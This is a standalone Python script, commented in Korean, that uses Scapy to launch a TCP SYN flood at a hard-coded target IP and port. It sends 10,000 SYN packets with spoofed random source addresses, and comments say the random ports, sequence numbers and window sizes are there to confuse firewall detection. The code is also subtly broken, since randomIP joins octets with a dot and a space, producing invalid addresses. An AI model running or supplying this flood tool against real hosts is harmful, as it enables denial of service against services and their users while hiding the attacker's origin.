from telnetlib import IP
from scapy.all import *
import os
import sys
import random
import socket
from scapy.layers.inet import TCP


def randomIP(): # 임의의 출발지 IP 주소를 생성하는 함수
    ip = ". ".join(map(str, (random.randint(0,255) for _ in range(4))))
    return ip

def randInt(): #방화벽 탐지 설정을 교란시키기 위해 무작위의 숫자를 추출하는 함수
    Firewall_disturb = random.randint(1000, 9000)
    return Firewall_disturb

def TCP_Flood (dstIP, dstPort, counter): # 조작된 패킷을 생성하는 함수
    total = 0
    print("Packets are sending...")
    
    for Firewall_disturb in range(0, counter):
        s_port = randInt() # 포트 번호 무작위 설정
        s_eq = randInt() # 일련 번호를 무작위로 설정
        w_indow = randInt() #윈도우 크기를 무작위로 설정
        IP_Packet = IP()
        IP_Packet.src= randomIP() #임의의 출발지 주소를 무작위로 생성
        IP_Packet.dst= dstIP #지정된 목적지 IP 주소를 공격 대상으로 설정
        TCP_Packet = TCP()
        TCP_Packet.sport = s_port # 생성한 포트 번호를 사용
        TCP_Packet.dport = dstPort # 지정된 목적지 포트 번호를 사용
        TCP_Packet.flags = "S" #SYN 플래그 생성
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow
        
        send(IP_Packet/TCP_Packet, verbose=0) # TCP 패킷 전송
        total = total+1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)
def main(): # 조작된 패킷을 생성하고 전송하는 함수
    dstIP= "169.254.8.43" # 공격 대상 IP 함수
    dstPort = 4321 # 공격대상 포트 함수
    counter = 10000 # TCP Flood 공격 횟수 지정
    TCP_Flood (dstIP, int (dstPort), int(counter))
main()